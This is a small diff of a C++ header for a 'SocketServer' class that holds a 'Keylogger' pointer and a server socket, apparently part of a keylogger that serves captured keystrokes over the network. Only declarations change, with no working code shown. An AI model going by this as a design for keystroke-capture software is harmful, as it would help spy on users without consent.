@@ -7,11 +7,11 @@
 class SocketServer {
 private:
 	Keylogger* logger;
-	SOCKET listenSocket;
+	SOCKET serverSocket;
 public:
-	SocketServer(Keylogger* logger);
+	SocketServer();
+	~SocketServer();
 	void start();
 	std::wstring getResponse(std::wstring request);
-	std::string getHostName();
 };
 
